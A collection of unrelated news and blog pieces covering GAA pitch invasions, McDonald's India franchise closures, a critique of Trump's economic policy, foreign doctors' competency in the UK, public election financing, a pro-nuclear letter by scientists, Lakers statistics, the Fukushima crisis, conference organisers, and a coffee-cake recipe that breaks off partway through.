Liam O'Neill says there is no room in the GAA for pitch invasions.This summer has already witnessed a couple of mass pitch invasions at the Gaelic Grounds and Clones after Limerick and Monaghan won the Munster SHC and Ulster SFC respectively, but the Association president says there is no place in our games for this traditional practice.O'Neill points out that pitch invasions are dangerous and is also concerned by what happened at Newbridge on Saturday night, when referee Joe McQuillan was jostled as he left the pitch at St Conleth's Park:"It shouldn't happen," the Laois man is quoted in The Irish Examiner. "There have been concerns and in fairness to our safety committee they have been very, very quick to point out where there are difficulties."They have expressed their views on certain venues and it shows that their attempts to put safety first have been totally justified."There will have to be a change because quite simply that can't be allowed to happen again. It shouldn't happen anywhere and we have to put in place whatever safety requirements to make sure that it doesn't happen."Any time there's a pitch invasion is like gambling; it's like driving without a seatbelt. You just don't know what's going to happen. The ideal situation is the one we are promoting. You're gambling, people's safety is at stake."Make no mistake, if something ever happens people won't say, 'Wasn't that man very foolish to go onto the pitch'; they'll blame us. We have outlined what we think is best practice and we would like people to follow that. The players actually prefer to have the pitch to themselves."It's an education process. There's no mixed message and we don't tolerate this, but when a horde descend on a pitch it's very hard to stop them."Our message on this is clear. There are certain commentators or people who say it's a populist thing, and they should be let on. But they should know better. It's not about taking draconian measures. It's a ground by ground thing."
McDonald's Indian business has taken a year-end beating due to a power struggle with one of its local partners.
The American fast-food chain has shut 84 of its restaurants amid a legal battle with its joint venture partner, Connaught Plaza Restaurants (CPRL), which operates 169 outlets in north and east India. CPRL, on its part, has blamed a key supplier, Radhakrishna Foodland, for these closures. It alleged that the vendor has stopped providing supplies to its restaurants, citing low volumes and an uncertain future.
“Almost all the outlets in east India have been shut because of the move by (the) logistics partner. Others (in north India) are also under pressure due to a supply crunch,” Vikram Bakshi, CPRL's managing director, told the Press Trust of India. Bakshi claims the vendor, “allegedly in collusion with McDonald's Corporation and their wholly-owned subsidiary McDonald's India Pvt Ltd…has decided to hold back stock paid for approximately Rs10 crore by us.”
Meanwhile, Radhakrishna Foodland has accused CPRL of non-payment of dues.
The shut-down comes after McDonald's India (MIPL) issued a notice of termination of its franchise agreement to CPRL in August 2017, alleging that the latter had breached the terms of the partnership.
MIPL also announced that it would withdraw all branding rights—brand name, trademarks, designs, operational and marketing practice, and food recipes—from CPRL. McDonald's then threatened closure if CPRL failed to respond suitably to the notice within 15 days. However, Bakshi has continued to operate the stores after contesting the termination notice at the National Company Law Tribunal.
Bakshi said that now the company is working towards finding alternate ways to resume business. “We will try and get them back in business over the next 7-10 days,” he told Quartz.
A McDonald's spokesperson rubbished allegations of its collusion with CPRL's vendors.
“This is between CPRL and their vendors, not MIPL. The allegation of us being involved in the decision comes from someone with whom we have had ongoing legal disputes. MIPL did not instruct any of CPRL's vendors to stop delivery to CPRL. We were only informed of their decisions afterwards,” the company said in an e-mailed statement. However, MIPL said it did inform CPRL's suppliers of its decision to terminate the franchise agreement.
Missing menu
Business has been difficult for Bakshi since the termination notice was issued.
Many vendors have stopped supplying ingredients and packaging material to CPRL. This has led to inconsistencies in the menu, with products such as its popular McFlurry and Soft Serve ice creams unavailable across some of its stores. Some outlets were even reportedly short on jalapenos, tomatoes, and milk supplies, the Wall Street Journal reported on Oct. 09.
At Connaught Place, the busy central business district of Delhi, three McDonald's outlets have been turning away patrons. At one particular restaurant, a notice about the company's falling out with its logistics partner was put up over a locked glass door was put up on Dec. 25. ”Due to the inability of our logistic partner & distribution centre to provide certain products to us, we are unable to serve your favourite McDonald's food,” the notice says.
Meanwhile, industry observers felt that the dispute would have little impact on the brand's consumer perception.
“Since the issue is one of control between the two partners and not a quality issue with the chain per say, things will go back to normal once it is resolved and restaurants open up,” said Gaurav Mayra, chairman, Franchise India.
McDonald's in India
McDonald's, which runs over 400 stores in India, arrived here in 1996.
The company operates through two partners: Bakshi's CPRL and Westlife Development, led by Amit Jatia, which operates 260 restaurants in the south and west. For the financial year ending March 2017, Westlife Development posted a turnover of Rs930.8 crore, according to a listing on the stock exchange. Shares of Westlife Development dropped by 1.19% on Dec. 26 amid the news of closures in parts of northern and eastern India.
Since its arrival, McDonald's has helped shape fast-food consumption in India. The American giant controls a 15.5% share of the market in the country, the second-highest after pizza chain Domino's, according to 2016 data provided by Euromonitor.
In an abrupt public announcement in August 2013, McDonald's ousted Bakshi as managing director of CPRL over alleged financial irregularities. It claimed that Bakshi's other business interests were benefiting through his management of CPRL. Bakshi moved the Company Law Board (now the National Company Law Tribunal or NCLT) in September 2013, arguing that his removal was intended to buy him out at a lower valuation for McDonald's to take full control of CPRL's business.
McDonald's is reportedly scouting for a new business partner to run stores in north and east India.
As Donald Trump fills his cabinet, what have we learned about the likely direction and impact of his administration's economic policy?
To be sure, enormous uncertainties remain. As in many other areas, Trump's promises and statements on economic policy have been inconsistent. While he routinely accuses others of lying, many of his economic assertions and promises – indeed, his entire view of governance – seem worthy of Nazi Germany's “big lie” propagandists.
Trump will take charge of an economy on a strongly upward trend, with third-quarter GDP growing at an impressive annual rate of 3.2% and unemployment at 4.6% in November. By contrast, when Barack Obama took over in 2009, he inherited from George W Bush an economy sinking into a deep recession. And, like Bush, Trump is yet another Republican president who will assume office despite losing the popular vote, only to pretend that he has a mandate to undertake extremist policies.
The only way Trump will square his promises of higher infrastructure and defence spending with large tax cuts and deficit reduction is a heavy dose of what used to be called voodoo economics. Decades of “cutting the fat” in government has left little to cut: federal government employment as a percentage of the population is lower today than it was in the era of small government under Ronald Reagan about 30 years ago.
With so many former military officers serving in Trump's cabinet or as advisers, even as Trump cozies up to the Russian president, Vladimir Putin, and anchors an informal alliance of dictators and authoritarians around the world, it is likely that the US will spend more money on weapons that don't work to use against enemies that don't exist. If Trump's health secretary succeeds in undoing the careful balancing act that underlies Obamacare, either costs will rise or services will deteriorate – most likely both.
During the campaign, Trump promised to get tough on executives who outsource American jobs. He is now holding up the news that the home heating and air-conditioning manufacturer Carrier will keep around 800 jobs in my home state of Indiana as proof that his approach works. Yet the deal will cost taxpayers $7m, and still allow Carrier to outsource 1,300 jobs to Mexico. This is not a sound industrial or economic policy, and it will do nothing to help raise wages or create good jobs across the country. It is an open invitation for a shakedown of the government by corporate executives seeking handouts.
Similarly, the increase in infrastructure spending is likely to be accomplished through tax credits, which will help hedge funds, but not America's balance sheet: such programmes' long track record shows that they deliver little value for money. The cost to the public will be especially high in an era when the government can borrow at near-zero interest rates. If these private-public partnerships are like those elsewhere, the government will assume the risks, and the hedge funds will assume the profits.
The debate just eight years ago about “shovel-ready” infrastructure seems to be a distant memory. If Trump chooses shovel-ready projects, the long-term impact on productivity will be minimal; if he chooses real infrastructure, the short-term impact on economic growth will be minimal. And back-loaded stimulus has its own problems, unless it is managed extremely carefully.
If Trump's pick for US treasury secretary, the Goldman Sachs and hedge fund veteran Steven Mnuchin, is like others from his industry, the expertise he will bring to the job will be in tax avoidance, not constructing a well-designed tax system. The “good” news is that tax reform was inevitable, and was likely to be undertaken by Speaker of the House Paul Ryan and his staff – giving the rich the less progressive, more capital-friendly tax system that Republicans have long sought. With the abolition of the estate tax, the Republicans would finally realise their long-held ambition of creating a dynastic plutocracy – a far cry from the “equality of opportunity” maxim the party once trumpeted.
Large tax cuts and large expenditure increases inevitably lead to large deficits. Reconciling this with Trump's promise to reduce the deficit will probably entail a return to Reagan-era magical thinking: despite decades of proof to the contrary, this time the stimulus to the economy brought by tax cuts for the rich will be so large that tax revenues will actually increase.
This story doesn't end well for Trump's angry, displaced Rust Belt voters. Unhinged budgetary policies will induce the US Federal Reserve to normalise interest rates faster. Some see incipient inflation (given the low unemployment rate); some believe the long period of ultra-low interest rates has distorted capital markets; and some want to “replenish their ammunition”, so that the Fed can lower interest rates should the economy slow down again.
Trump has argued that the Fed should raise interest rates. The Fed, which took the first step toward normalisation in early December, will almost certainly deliver – and Trump will soon regret what he wished for. There's a good chance that the monetary contraction will outweigh the fiscal stimulus, curbing the Obama growth spurt currently underway. Higher interest rates will undercut construction jobs and increase the value of the dollar, leading to larger trade deficits and fewer manufacturing jobs – just the opposite of what Trump promised. Meanwhile, his tax policies will be of limited benefit to middle-class and working families – and will be more than offset by cutbacks in health care, education, and social programmes.
If Trump starts a trade war – by, say, following through on his vow to impose a 45% tariff on imports from China and to build a wall on the US border with Mexico – the economic impact will be even more severe. Trump's cabinet of billionaires could continue to buy their Gucci handbags and $10,000 Ivanka bracelets, but ordinary Americans' cost of living would increase substantially; and without components from Mexico and elsewhere, manufacturing jobs would become even scarcer.
To be sure, a few new jobs will be created, mainly in the lobbying shops along K Street in Washington, DC, as Trump refills the swamp that he promised to drain. Indeed, America's bog of legal corruption is likely to reach a depth not seen since Warren Harding's administration in the 1920s.
And there really is no silver lining to the cloud that now hangs over the US and the world. As bad as his administration will be for America's economy and workers, its policies on climate change, human rights, the media, and ensuring peace and security are likely to be no less damaging for everyone else.

Half of all foreign doctors in Britain do not have the necessary skills to work here but can practise because the competency exam is too easy, a major study finds.
The majority of the 88,000 foreign doctors in the health service would fail exams if they were held to the same standard as their British colleagues, according to the research.
The disclosure will add to concerns over the reliance of the NHS on foreign doctors. The language ability of some has been questioned in recent years. The research potentially shows more wide-ranging inadequacies. Around 1,300 foreign physicians are licensed each year by the General Medical Council after passing an exam which assesses clinical and language skills.
But the study, commissioned by the GMC and carried out by University College London, found that around half would fail to reach the standards expected of British doctors. Its authors have called for the pass rate of the competency exam to be raised from 63 to 76 per cent to “ensure patient safety”.
Chris McManus, professor of psychology and medical education at UCL, said: “There is no real mechanism for checking that doctors coming from outside Britain have been trained to the same level as British doctors. We wanted to find out what level overseas doctors would have to reach if they were to be as competent as British graduates. I think it's inevitable that the bar will need to be set higher.
“The fact that you already have overseas doctors being over-represented at GMC hearings is indicative of the problem. Many are simply not trained to the same standards.”
More than 88,000 foreign-trained doctors are registered to work in Britain, including 22,758 from Europe. They make up almost a third of all NHS doctors but account for approximately two thirds of those struck off each year. The Professional and Linguistics Assessments Board, the exam they must pass to practise in Britain, is designed to ensure the same skill level as a British graduate a year after completing medical school.
But UCL discovered there was “no formal mechanism” to ensure the exam was as tough as assessments taken by British doctors. When researchers compared results they found that foreign doctors were consistently performing less well.
Around half of doctors trained abroad would not pass the most comparable British test, the report authors said.
“It may be that some overseas doctors have had poor training and when they come to Britain they will catch up quickly and thrive in a better environment,” said Prof McManus.
“But alternatively some may feel completely overwhelmed, particularly with new technology that they have not yet come across. And that is of concern.”
Figures from 2012 showed that of 669 doctors who were struck off or suspended in the previous five years, 420 had trained abroad.
The country with the largest number of doctors removed or suspended from the medical register is India, followed by Nigeria and Egypt.
In 2011 the GMC set up a working party to review whether the competency exam needed to be updated and asked UCL to compile research. The working party is due to report later this year but UCL's findings have been made public after they were used to defend an allegation that the GMC was racist in marking the exams of foreign doctors.
The British Association of Physicians of Indian Origin launched a judicial review claiming the GMC failed too many doctors from overseas in GP tests. But a High Court judge ruled against them this month after seeing UCL's report.
Prof McManus said: “We've been through the figures with a fine-toothed comb and there is simply nothing to show that examiners are being racist.”
The Indian physicians' association (BAPIO) said it was dismayed by the findings. It has called for a common test for all doctors. Dr Ramesh Mehta, its president, said: “We must drive standards up, but we need objective evidence and fair processes. We are foremost NHS doctors and want the NHS to be the best; this blame game is not helpful.”
The GMC said the research raised important questions and agreed that changes were “vital” for patient safety.
“We are determined to do what we can to maintain high standards of medical practice in the UK, regardless of where doctors receive their training,” said Niall Dickson, the chief executive of the GMC.
“That is why we are reviewing the way in which we assess the knowledge and skills of those seeking to practise here … This review, along with our decision to increase the score we require in our assessment of English language skills, will help us ensure that high standards of practice are maintained.”
The study, which is published in the British Medical Journal, also showed that doctors from within the EU fall short.
In 2008, David Gray, a pensioner, died after a doctor trained in Germany, Daniel Ubani, gave him ten times the recommended dose of pain relief while working his first shift as a locum GP.
Tougher language checks for European doctors come into force this summer.
Dr Maureen Baker, chairman of the Royal College of General Practitioners said: “In the interests of patient safety and fairness to international medical graduates, we recommend that the current Professional and Linguistic Assessment Board standard setting process is reviewed as a matter of urgency.”
This week's elections featured a number of losses for progressive politics, but there was at least one silver lining: They showed that when voters have an opportunity to reject big donor politics, they overwhelmingly will. In both Maine and Seattle, voters approved ballot measures to implement or strengthen public financing, an important reform that can increase the diversity of the donor pool and reduce the power of big money in politics. In Maine, the ballot initiative would boost funds for qualifying candidates and require more disclosure of some political spending. In Seattle, Initiative 122 implements a first of its kind voucher program, which gives each voter $25 vouchers that they can give to their preferred candidate for mayor, city council and city attorney. The initiative also bars contribution from companies or individuals that have large contracts with the city.
Why do these programs matter? A recent study from the Institute for Southern Studies of North Carolina shows that the donor class is overwhelmingly white, far whiter than the general public. Alex Kotch, author of the report, writes, “95 percent of the largest North Carolina donors to key federal races in the 2014-2016 election cycles were white, while non-Hispanic whites make up 65 percent of the state population.” A study of Seattle's 2013 election suggests that while Seattle is 67 percent non-Hispanic white, the neighborhoods from which more than half of contributions came from were 80 percent white.

There is evidence that public financing would increase the diversity of the donor base. A study of New York City's 2009 municipal election finds that “donors giving $10 or less live in neighborhoods that are more racially diverse than the city as a whole.” Research suggests that the city's public matching system (which uses public funds to match small donations) increased the diversity of the city's donor pool. Other research suggests that the small donor pool tends to be more racially diverse than the large donor pool and that donors as a whole tend to be whiter than the general population.
The donor pool also has differing preferences from the general population. As I've noted several times, there is ample evidence that donors are pulling the nation to the right on economic issues, exacerbating rising inequality. Donors of all stripes tend to be more economically conservative as the chart below, made with data from the 2014 Cooperative Congressional Election Study shows.
A study by Didi Kuo and Nolan McCarty finds, “Donors are also more supportive of low taxes and freer trade. Donors were slightly less supportive of the Affordable Care Act, which overhauled the American health care system to promote universal coverage.” One study by a group of scholars spearheaded by Wesley Joe of the Campaign Finance Institute finds, “Large donors are more likely than small donors to give in the interest of advancing their own narrow economic concerns, as distinct from a more general concern about the economy.” The chart below shows this. Large donors are far more likely to report donating for “material” reasons (advancing their own material interests), while small donors tend to donate for “purposive reasons” (ideological alignment and which candidate they feel would be better for the economy). Their study also finds that small donors are closer to the opinions of non-donors than large donors, with large donors being more economically conservative.
There is evidence that public financing frees politicians from the influence of the donor class. A study by Peter Francia and Paul Herrnson finds that candidates who are publicly financed spend less time raising money than privately funded counterparts. Miller finds that publicly financed candidates spend more time interacting with the general public. That matters, because as Connecticut Senator Chris Murphy has said of fundraising for his campaign, “I talked a lot more about carried interest inside of that call room than I did in the supermarket . . . [The people I'm calling] have fundamentally different problems than other people.”

A Demos study of public financing in Connecticut finds that, “In the short time since public financing has been in place, Connecticut has seen an increase in diversity in the legislature, a more substantive legislative process, and more freedom from big donor and special interests.”
The experience of one former legislator is telling. He tells Demos,
“Before public financing, during the session…there were ‘shakedowns' where lobbyists and corporate sponsors had events and you as a legislator had to go. That's no longer a part of the reality.”
There are other benefits of public financing. In his book, "Subsidizing Democracy," Michael Miller finds, that roll-off (when individuals vote for the most high-profile contests but don't complete their ballot) appears to be lower when at least one candidate ran with public financing. If public financing does increase turnout, that would have further political benefits for Laws for political equality help increase economic equality. A study by Patrick Flavin finds that, “states with stricter campaign finance laws devote a larger proportion of their annual budget to public welfare spending in general and to cash assistance programs in particular.” Thus, by limiting big money in politics,
Public financing of elections is popular and, given the Supreme Court decisions over the last few decades, one of the few options left to reformers that want to make America live up to its democratic values. The ballot initiatives in Seattle and and Maine provide a glimmer of hope in the often bleak news about the increasing power of the donor class.
Academics argue that nuclear power is essential to save the planet from climate change, but critics say they seem to have forgotten the danger of a nuclear winter. LONDON, 26 December, 2014 − Seventy-five professors from the world's leading universities have signed a letter urging environmentalists to re-think their attitude to nuclear power as a way to save the planet from climate change and preserve its animals, plants and fish. Ironically, it is two Australian academics who came up with the research. They come from a country whose government has repudiated the Kyoto Protocol, reversed measures to cut climate change, is one of the world's biggest coal exporters, and has no nuclear power. Australia has just recorded the hottest spring since records began 100 years ago. The two professors are Barry W. Brook, Chair of Environmental Sustainability at the University of Tasmania, and Corey J.A. Bradshaw, Sir Hubert Wilkins Chair of Climate Change at the University of Adelaide's Environment Institute. Their backers include many leading experts on ecology, biodiversity, evolution and geography from the US, UK, China and India. The letter is significant because previous pleas for a role for nuclear power have mostly come from physics professors, who could reasonably be said to love the technology for its own sake. But this group has no stake in nuclear power, and their argument is based purely on the need to save the planet and its species from overheating and excess use of valuable land for renewables. Professors Brook and Bradshaw have had a paper published in the magazine Conservation Biology, in which they evaluated all possible forms of energy generation. Wind and nuclear power had the highest “benefit-to-cost ratio”.
“…we entreat the conservation and environmental community to weigh up the pros and cons of different energy sources…”
The letter urges environmentalists to read the paper, and says the two professors “provide strong evidence for the need to accept a substantial role for advanced nuclear power systems with complete fuel recycling − as part of a range of sustainable energy technologies that also includes appropriate use of renewables, energy storage and energy efficiency. “This multi-pronged strategy for sustainable energy could also be more cost-effective and spare more land for biodiversity, as well as reduce non-carbon pollution (aerosols, heavy metals). “Given the historical antagonism towards nuclear energy amongst the environmental community, we accept that this stands as a controversial position. “However, much as leading climate scientists have recently advocated the development of safe, next-generation nuclear energy systems to combat global climate change, we entreat the conservation and environmental community to weigh up the pros and cons of different energy sources, using objective evidence and pragmatic trade-offs, rather than simply relying on idealistic perceptions of what is ‘green'. “Although renewable energy sources like wind and solar will likely make increasing contributions to future energy production, these technology options face real-world problems of scalability, cost, material and land use, meaning that it is too risky to rely on them as the only alternatives to fossil fuels.
Conflict risk
“Nuclear power − being by far the most compact and energy-dense of sources − could also make a major, and perhaps leading, contribution. As scientists, we declare that an evidence-based approach to future energy production is an essential component of securing biodiversity's future and cannot be ignored. It is time that conservationists make their voices heard in this policy arena.” The letter has attracted a wide variety of comments. Some are supportive, but others say that the professors have ignored one of the greatest threats to the planet – a nuclear war. Dr Jim Green, writing in the Ecologist magazine, makes the point that nuclear power and nuclear proliferation go hand in hand: “Even a modest exchange of nuclear warheads could profoundly affect biodiversity, and large scale nuclear war certainly would.” Dr Green also attacks the paper for endorsing fast breeder reactor technology as the solution to climate change. He says that the “fast reactor techno-utopia presented by Brook and Bradshaw is theoretically attractive”, but has already been tried unsuccessfully, and cannot be made to work in the real world. – Climate News Network
Here's a look at some of the good, bad and ugly numbers from the Lakers' 3-11 start to the 2014-15 season:
1: Rank of L.A.'s schedule difficulty through 14 games. Opponents post a .589 win percentage, putting the Lakers well above No. 2 Sacramento (.574). At the opposite end are the New York Knicks (.412). The Lakers have played only two games against the far weaker Eastern Conference, beating both Charlotte and Atlanta, while losing 10 of 11 games against Western squads.
1.4: Blocks per game for Ed Davis in his 22.2 minutes per game, a team best.
3: Players that are out for the entire season if Xavier Henry's Achilles injury suffered during Monday's practice is confirmed to be a rupture, as feared. Julius Randle (fractured right tibia) and Steve Nash (back/nerve issues) have already been shut down for the year.
4.9: Assists per game for Jeremy Lin, which leads the Lakers.
15.9: Points in the paint per game for the Lakers, which ties Minnesota for second-most in the NBA. Indiana paces the league with 16.2 per game.
19: Years in the NBA for Kobe Bryant. Here were the league's most prolific scorers in year 19 prior to Kobe: Kareem Abdul-Jabbar (1987-88) – 14.6 ppg; Karl Malone (2003-04) 13.2 ppg; John Stockton (2002-03) – 10.8 ppg; Shaquille O'Neal (2010-11) – 9.2.
26.7: Bryant's NBA-best scoring average.
35.5: Kobe's usage rate, which tops all other players, including Indiana's Rodney Stuckey, whose second-place rating clocks in 4.0 points behind Bryant.
35.7: Bryant's minutes played per game, tied for 13th in the NBA.
38.1: Bryant's field goal percentage, by far the lowest of his career.
44.0: L.A.'s field goal percentage, ranking 23rd in the NBA.
48.7: Opponent field goal percentage for the Lakers, which ranks 29th in the NBA.
104: Steals for the Lakers, the 9th most in the NBA, led by 18 from Bryant and 17 from Ronnie Price.
148: Three-pointers made by Lakers opponents, the most in the NBA. It hasn't helped the Lakers have played so many high-scoring Western teams.
181: Offensive boards grabbed by L.A., the most in the NBA, led by Jordan Hill's league-best 61 (4.4 per game).
218: Points needed for Kobe (32,074) to catch Michael Jordan (32,292) for third on the NBA's all-time scoring list.
319: Games missed to injury for the Lakers in 2013-14, by far an NBA high. They'll miss at least 231 more games with Nash, Randle and Henry alone this season, plus the 10 games Nick Young has already sat out with a thumb injury. Ryan Kelly has already missed 12 games with multiple hamstring injuries and is expected to be out at least five more weeks.
403: Free throw attempts for L.A.'s offense, ranking second in the NBA, which comes by design of Byron Scott's offense considering the personnel. However:
408: The Lakers have allowed the most free throw attempts in the NBA.
54,708: Combined regular season and playoff minutes played by Bryant, which ranks 5th all-time behind only Kareem Abdul-Jabbar (66,297), Malone (63,493), Jason Kidd (56,199) and Wilt Chamberlain (55,418).
55,000: Miles the Lakers will fly this season traveling to road games, second in the NBA to Portland (60,000), according to Sports Illustrated.
More nuclear reactors show signs of trouble
Updated
Two more reactors at the troubled Fukushima nuclear power plant in Japan have lost cooling functions as the plant's operators struggle to contain what threatens to become a meltdown.
Radiation levels rose to harmful levels at the facility earlier today following two reactor blasts and a fire at a spent fuel storage pond.
But government spokesman Yukio Edano says radiation levels have since fallen at the plant, 250 kilometres north-east of the capital Tokyo.
"This high level of radiation is just temporarily reading so in the long run it is not particularly dangerous and the reading is now getting lower," he said.
"We don't need to worry about this reading at the moment."
Mr Edano says the earlier high reading could have been caused by rubble from Monday's explosion at one reactor rather than from any continuing leak.
But he says cooling of the No. 5 and No. 6 reactors now appears not to be working properly, with slight rises in temperature recorded.
Explosions at the four other reactors at the plant followed the losses of their cooling systems after Friday's massive earthquake and tsunami.
A TEPCO official has told Kyodo that water in the pool storing spent nuclear fuel rods at the No. 4 reactor that caught fire this morning may be boiling, causing the water level to drop.
Mr Edano says today's explosion at the No. 4 reactor was caused by a build-up of hydrogen.
"Spent nuclear fuel in the reactor heated up, creating hydrogen and triggered a hydrogen explosion," he said.
The International Atomic Energy Agency (IAEA) says the fire at the reactor's spent-fuel pond has been extinguished.
The director of Japan's nuclear and industrial safety agency, Toshiro Bannai, warns reactors No. 5 and No. 6 are at risk of the same problems with their spent-fuel pools.
He says the temperature in the No. 4 pool more than doubled from its regular temperature of about 40 degrees Celsius.
"The alloy of the spent fuel, made from Zirconium alloy, these metals react with water when its temperature rises up to [about] 100 degrees [Celsius] to produce hydrogen," he said.
"The pools temperature is maybe 30-40 degrees [normally], it's not a high temperature ... but we need some cooling systems because spent fuel has a power of heat."
The government reported apparent damage to part of the container shielding the No. 2 reactor following a blast there earlier today. However, it was unclear whether the damage was caused by the blast.
Similar hydrogen blasts hit the No. 1 and No. 3 reactors on Saturday and Monday.
Radiation levels reached as high as 400 milisieverts an hour at the plant earlier today, thousands of times higher than readings taken before the latest blasts.
The level of radiation in Tokyo also rose above normal levels in the morning due to radiation emitted from the nuclear power plant but has now also fallen.
"We monitored a higher than normal amount of radiation in the morning in Tokyo but we don't consider it to be at a level where the human body is affected," said Sairi Koga, an official of the Tokyo Metropolitan Government.
He says the level fell from an average 0.809 micro-sieverts between 10:00am and 11:00am (local time) to 0.075 micro-sieverts four hours later.
Winds are now dispersing the radioactive material over the Pacific Ocean, away from Japan and other Asian countries, the World Meteorological Organisation (WMO) has said.
But the United Nations agency warned that although effects have been offshore so far, weather conditions could change and it was closely monitoring satellite and other data.
Trouble at the nuclear plant has sparked a rout on the stock market and panic buying in supermarkets.
Japan is struggling to cope with the enormity of the damage from Friday's record quake and the tsunami that raced across vast tracts of its north-east, destroying all before it.
The official death rose to 2,414, according to police, but officials warn at least 10,000 people are likely to have perished.

Sometimes it would appear that the PCO (Professional Conference Organiser) is regarded as merely a booking agent and it seems appropriate to shift this perception as the PCO is, in effect, quite possibly a corporate secretary's Genie in the Bottle!
This industry has grown enormously over the past 25 odd years and it is understandable as the PCO is a dedicated individual who incorporates all his or her clients' requirements and handles all the ancillary services affording the corporate secretary or P.A., the CEO or whoever the client contact may be peace of mind, time to focus on other important issues and the content of their forthcoming event. There is little the client needs to do themselves as far as planning the event is concerned with the exception of the final decisions on various issues such as guests who will share rooms, who the VIP's are, agendas etc. and of course, affording them the time needed to attend to the content of the event, select their speakers and so much more.
Audio Visual :
All PCO's are in contact with everyone, everywhere and have learned what is required for the size of the event they are managing or coordinating. This enables them to give the best advice to the client, according to the venue the client has selected, according to acoustics in the venue, according to space and seating arrangements. Your PCO will take you to view a variety of venues in the area you are considering, bearing in mind what your budget is, or if this is not possible will make these arrangements on your behalf to visit the conference venues at your convenience. The PCO will obtain as many quotes as they can from hotels and conference centres
nationally for conference facilities, catering, accommodation, day trips away, bus tours etc. They will further call for quotes from the numerous outsourced suppliers whom they also know and work with on a daily basis. This would include team building ideas, finding the nearest Golf Course, and what would best work at the venue of choice; it would include transport to and from the venue and/or airport; it would include planning a Gala dinner to include entertainment, special themes, seating plans, décor, to assist with menu decisions and to recommend how to manage the bar arrangements for the event. The list is endless.
The Conference:
An essential ingredient in the success of the event is the ‘bones' of the conference or event. A PCO will gather all the paper work from either the client or from the various trainers or facilitators giving lectures or reading papers at the conference, whether electronically or printed and will ensure that these are given to the Audio Visual company ahead of time for their planning and ‘loading' onto their system. Where necessary, there will be one or two or more technicians on site throughout the event to ensure the smooth running of this vital aspect. These highly qualified people are sound engineers, visual engineers and diligently organised and focussed people who have studied your facilitators' papers thoroughly before the event. They simply cannot drop the ball! The PCO knows who the most trustworthy and reliable outsourced companies are.
Registration and Pre-Registration:
A PCO will handle all pre-registration from delegates wishing to participate at the conference, having designed a registration form which is e-mailed to all possible attendees some time before the event; collection of their payment for accommodation and/or conference if a central account is not responsible for payment of the day costs. This dedicated person or people will then be at the venue to register delegates on the arrival day, having already, prior to the event, ordered and had couriered, per the clients' spec, conference bags, pre-printed with company logo, packed these with the necessary materials being handed out on registration day. They will hand out pre-made lanyards and name badges upon registration and ensure that pre-payment has been made.
Catering:
A very important issue is diet: A PCO will always require this information from the delegates upon their pre-registration or from his or her client ahead of time. This would include requests for halaal, kosha, vegetarian, vegan, diabetic meals and note allergic conditions etc. and the venue would be pre-advised of all these finer details well ahead of time so that these delegates enjoy the type of cuisine they specifically call for. The same would apply to delegates with disabilities, where special accommodation is required; bar requirements, assistance with wine choices, etc.
Ten days or so, prior to an event, the PCO will send out a Function Sheet to the client with all the details he or she has gathered throughout the planning period and the sometimes daily contact with the client, leading up to the commencement of the event, for the client to check as it is essential to the success of the event to ensure that there is no room for error. On this, will already be a rooming list which he or she will have got from the client thereby allowing the check in process at the venue to run smoothly and quickly without unnecessary delays.
Room Drops and gifts are often called for and the PCO will attend to all this on the clients' behalf if necessary, will wrap them and ensure that they are placed in hotel rooms ahead of time or at any other appropriate place or time the client desires. Frequently, gifts or trophies are given out at an Awards Ceremony which might form part of the event. The PCO will attend to all of this.
Exhibitions:
Should your event also incorporate an expo during the run of the conference, the PCO will procure the best prices for Shell Schemes for the expo. They will then send the room plan with the numbered Shell Schemes to the client organising the event on behalf of his or her company to allow them to place exhibitors in the booths that are best suited to their products.
Translation Facilities:
The PCO is also connected to translators, in any language and will arrange all the translation requirements on behalf of the client. This is vital as well as many international events are taking place more and more frequently in South Africa now.
It should be remembered too that throughout the planning period of a conference or event, the PCO is also constantly in contact with the hotel or conference centre, and all out sourced suppliers, updating them on any changes; updating them on dietary requirements, rooming changes, agendas for meals and teas, technical requirements, entertainment and absolutely everything and anything that will take place during the conference. It is essential that the hotel or conference centre and the outsourced suppliers are well-informed about absolutely everything about the event and it is up to the PCO to ensure that he or she obtains this information as soon as possible after the booking has been confirmed. It can take months, or weeks and daily contact as the event approaches. It depends on the size and content of the event. This dedicated person will be your support.
Trust is very important. A client will discover early on if they have selected a PCO he or she will be compatible with. Once this has been established, allow the PCO to get on with what they know best while liaising with you, the client as often as is required. Strong relationships are built up around the event and trust is the key . . . vital to the success of the event too is to record every tiny detail in writing between yourself and your PCO and for the PCO, between the PCO and the venue!
Note ‘Attention To Detail' !
And if space prevailed . . . there is still so much untouched information to discuss . . . Each event develops its own dynamic, its own life and there is always something new to learn.
In a nutshell, a reputable PCO is, nowadays a necessity. This person or these people are here to serve. Service is what their business is about. They live it, they love it and for them, there is also a great sense of achievement when the whole plan comes together beyond expectation! This is what we might call a Win-Win scenario. Secretaries and P.A's, CEO's, Financial Managers, H.R. Managers (the list goes on) … simply haven't got the time to attend to all the nuts and bolts of an event themselves in their 24 hour days, amongst a trillion other demands on their time.

If there is one thing that is a staple in this household- it is COFFEE. We love it. Every morning, thoughout the day and some nights too. The man and I love it…the smell, the taste– the overall ambiance of a good cup o' joe. Which is why we were delighted to be able to discover Ambiance Coffee from Smart and Final. Not only that, but we got to create a recipe to pair with this delicious coffee!
My husband is the cook/baker/Get-out-of-my-kitchen-yeller around here so he mulled over several recipes he saw before he decided on making a Raspberry Almond Coffee Cake (which we dubbed- Raspberry Pizza…see below! I made up a list from the ingredients and headed to our local Smart and Final with my daughter. My daughter became my little helper…she loved holding our list, crossing things off as we went, and when we found the coffee aisle- she said “Mommy, look it's your favorite!” (she knows me well, lol).
Along the way we found some fantastic prices on several First Street Items, another Smart and Final brand that we love.
We headed home- ready for daddy to bake us a treat! While we aimed for coffee cake- it kinda looked like a pizza, so my daughter name it “Raspberry Pizza w/Almonds” Check out his recipe below- a perfect pair to the our new favorite coffee- Ambiance Costa Rican Tarrazu.
Raspberry Almond Coffeecake
Ingredients:
1 cup raspberries (prefer fresh- frozen is OK)
3 tbsps brown sugar
1 cup all-purpose flour
1/3 cup white sugar
1/2 tspn baking powder
1/4 tspn baking soda
1/8 tspn salt
1/2 cup sour cream
2 tbspns butter or margarine, melted
1 tspn vanilla extract
1 egg
sliced almonds
For Glaze
1/4 cup sifted confectioners sugar
1 tspn milk
1/4 teaspoon vanilla extract
Directions:
Preheat oven to 350 degrees F (175 degrees C). Spray an 8 inch round cake pan with cooking spray.
Combine raspberries and brown sugar in a bowl. Set aside.
